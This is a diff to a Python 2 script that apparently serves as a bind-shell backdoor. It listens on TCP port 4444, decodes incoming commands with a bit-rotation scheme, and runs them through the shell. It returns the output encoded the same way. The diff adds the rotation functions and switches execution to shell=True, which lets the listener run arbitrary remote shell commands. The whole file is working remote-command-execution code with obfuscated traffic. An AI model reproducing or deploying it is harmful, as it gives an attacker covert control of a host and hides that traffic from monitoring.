@@ -1,9 +1,24 @@
+# -*- coding: utf-8 -*-
 import socket
 import sys
 import subprocess
 
+def shiftLeft(val):
+	if val > 127:
+		val = (val << 1) - 256 + 1
+	else:
+		val = val << 1
+	return val
+
+def shiftRight(val):
+	if (val % 2 == 1):
+		val = (val >> 1) + 128
+	else:
+		val = val >> 1
+	return val
+
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-server_address = ('172.16.0.201', 4444)
+server_address = ('192.168.1.111', 4444)
 print >>sys.stderr,'Starting up on %s port %s' % server_address
 sock.bind(server_address)
 
@@ -20,16 +35,15 @@ while True:
 			command = ''
 			data = connection.recv(1024)
 			for i in data:
-				tempint = ord(i) >> 1
-				command += chr(tempint)
-			print >> sys.stderr, 'Received "%s"' % data
+				tempint = shiftRight(ord(i))
+				command += str(unichr(tempint))
 			if data:
-				command = command.strip()
 				print command
-				output = subprocess.check_output(command.split())	
+				output = subprocess.check_output(command, shell=True)	
 				ret_mesg = ''
 				for i in output:
-					tempint = ord(i) << 1
+					# print i
+					tempint = shiftLeft(ord(i))
 					ret_mesg += chr(tempint)
 				if (ret_mesg == ''):
 					ret_mesg = '\n'
